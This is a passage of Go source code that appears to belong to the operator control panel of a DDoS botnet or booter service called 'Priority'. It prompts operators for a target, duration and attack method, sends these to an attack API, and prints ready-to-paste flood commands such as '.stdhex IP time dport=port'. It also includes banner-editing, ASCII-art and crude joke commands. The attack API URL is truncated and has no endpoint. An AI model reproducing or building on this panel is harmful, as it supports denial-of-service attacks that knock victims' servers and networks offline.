			this.conn.Write([]byte("\033[00;1;95m                      ▄▄▄\033[00;1;96m·\033[00;1;95m▄▄▄  \033[00;1;96m▪\033[00;1;95m        ▄▄▄  \033[00;1;96m▪\033[00;1;95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[00;1;95m ▄▌\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ▐█ ▄█▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m ▪\033[00;1;95m     ▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m •\033[00;1;95m██  ▐█\033[00;1;96m▪\033[00;1;95m██▌\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                      ██▀\033[00;1;96m·\033[00;1;95m▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▐█\033[00;1;96m.▪\033[00;1;95m▐█▌▐█\033[00;1;96m▪\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ▐█\033[00;1;96m▪·•\033[00;1;95m▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌▐█▌\033[00;1;96m.\033[00;1;95m▐▌▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[00;1;95m ▐█▀\033[00;1;96m·.\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     .\033[00;1;95m▀   \033[00;1;96m.\033[00;1;95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[00;1;95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m\r\n"))
			this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ╔════════════════════\033[00;1;96m════════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ║- - - - - Welcome To\033[00;1;96m \033[34mPriority\033[00;1;96m! - - - - -║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ║- - Please Enter A \033[34mTIME\033[00;1;96m To Continue! - -║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ╚════════════════════\033[00;1;96m════════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mTIME\033[0m: "))
			timee, err := this.ReadLine(false)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[00;1;95m                      ▄▄▄\033[00;1;96m·\033[00;1;95m▄▄▄  \033[00;1;96m▪\033[00;1;95m        ▄▄▄  \033[00;1;96m▪\033[00;1;95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[00;1;95m ▄▌\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ▐█ ▄█▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m ▪\033[00;1;95m     ▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m •\033[00;1;95m██  ▐█\033[00;1;96m▪\033[00;1;95m██▌\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                      ██▀\033[00;1;96m·\033[00;1;95m▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▐█\033[00;1;96m.▪\033[00;1;95m▐█▌▐█\033[00;1;96m▪\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ▐█\033[00;1;96m▪·•\033[00;1;95m▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌▐█▌\033[00;1;96m.\033[00;1;95m▐▌▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[00;1;95m ▐█▀\033[00;1;96m·.\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     .\033[00;1;95m▀   \033[00;1;96m.\033[00;1;95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[00;1;95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m\r\n"))
			this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ╔════════════════════\033[00;1;96m════════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ║- - - - - Welcome To\033[00;1;96m \033[34mPriority\033[00;1;96m! - - - - -║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ║- -Please Enter A \033[34mMETHOD\033[00;1;96m To Continue!- -║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ╚════════════════════\033[00;1;96m════════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mMETHOD\033[0m: "))
			method, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "&host=" + locipaddress + "&port=" + port + "&time=" + timee + "&method=" + method + ""
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[00;92mSent, API Attack Has Sent!\033[0m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mFailed, Attack Failed To Send!\033[0m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[00;1;95m                      ▄▄▄\033[00;1;96m·\033[00;1;95m▄▄▄  \033[00;1;96m▪\033[00;1;95m        ▄▄▄  \033[00;1;96m▪\033[00;1;95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[00;1;95m ▄▌\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ▐█ ▄█▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m ▪\033[00;1;95m     ▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m •\033[00;1;95m██  ▐█\033[00;1;96m▪\033[00;1;95m██▌\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                      ██▀\033[00;1;96m·\033[00;1;95m▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▐█\033[00;1;96m.▪\033[00;1;95m▐█▌▐█\033[00;1;96m▪\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ▐█\033[00;1;96m▪·•\033[00;1;95m▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌▐█▌\033[00;1;96m.\033[00;1;95m▐▌▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[00;1;95m ▐█▀\033[00;1;96m·.\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     .\033[00;1;95m▀   \033[00;1;96m.\033[00;1;95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[00;1;95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m\r\n"))
			this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ╔════════════════════\033[00;1;96m════════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ║- - - - - Welcome To\033[00;1;96m \033[34mPriority\033[00;1;96m! - - - - -║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ╚════════════════════\033[00;1;96m════════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;92mAPI Result\033[0m: \r\n" + locformatted + "\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if userInfo.admin == 1 && cmd == "CHMSG" || userInfo.admin == 1 && cmd == "chmsg" {

			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mNew MSG: "))
			msg, err := this.ReadLine(false)
			os.Remove("msg")
			f, err := os.Create("msg")
			l, err := f.WriteString(msg)
			if err != nil {
				f.Close()
				return
			}

			fmt.Println(l, "                                \033[00;1;96m║\033[00;1;95mMSG Changed\033[0m")
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mMSG Changed!\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "ASCII" || cmd == "ascii" {
			data, err := ioutil.ReadFile("msg")
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" \033[00;1;95m|\033[0m 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
			this.conn.Write([]byte("\033[00;1;95m                      ▄▄▄\033[00;1;96m·\033[00;1;95m▄▄▄  \033[00;1;96m▪\033[00;1;95m        ▄▄▄  \033[00;1;96m▪\033[00;1;95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[00;1;95m ▄▌\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ▐█ ▄█▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m ▪\033[00;1;95m     ▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m •\033[00;1;95m██  ▐█\033[00;1;96m▪\033[00;1;95m██▌\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                      ██▀\033[00;1;96m·\033[00;1;95m▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▐█\033[00;1;96m.▪\033[00;1;95m▐█▌▐█\033[00;1;96m▪\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ▐█\033[00;1;96m▪·•\033[00;1;95m▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌▐█▌\033[00;1;96m.\033[00;1;95m▐▌▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[00;1;95m ▐█▀\033[00;1;96m·.\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     .\033[00;1;95m▀   \033[00;1;96m.\033[00;1;95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[00;1;95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m\r\n"))
			this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mhttps://pastebin.com/DbC8zm50\033[0m\r\n"))
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95m^^ Link To See Fonts Names ^^\033[0m\r\n"))
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95m  'To Space In Text Do A +'\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mText: "))
			text, err := this.ReadLine(false)
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mFont: "))
			font, err := this.ReadLine(false)
			if err != nil {
				return
			}

			url := "http://artii.herokuapp.com/make?text=" + text + "&font=" + font + ""
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				continue
			}

			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte("\033[0m\r\n"))
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mInvalid Font Or Text!\033[0m\r\n")))
				continue
			}

			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m" + locformatted + "\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "REPORT" || cmd == "report" {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mUsername To Report: "))
			report, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mReason: "))
			reason, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mReported - \033[00;1;96m" + report + "\033[0m\r\n"))
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mReason - \033[00;1;96m" + reason + "\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == ".BOOTHELP" || cmd == ".boothelp" {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mIP: "))
			iptohit, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mPort: "))
			porttohit, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mTime: "))
			timetohit, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mCopy And Paste To Send The Attack\033[0m\r\n"))
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95m.stdhex " + iptohit + " " + timetohit + " dport=" + porttohit + "\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "CUM" || cmd == "cum" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(500 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░████░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(500 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░████░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░███░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(500 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░████░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░███░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░█░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(500 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░████░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░███░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░█░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(500 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░████░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░███░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░█░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(500 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░████░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░███░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░█░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(500 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░██░██████████░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░████░░░░░░██████░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░██░░░░█░░░░░░░░░█░░░░██░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░██████░░░░░░░░░███████████░████░░░░░░░░░░░\033[0m\r\n"))
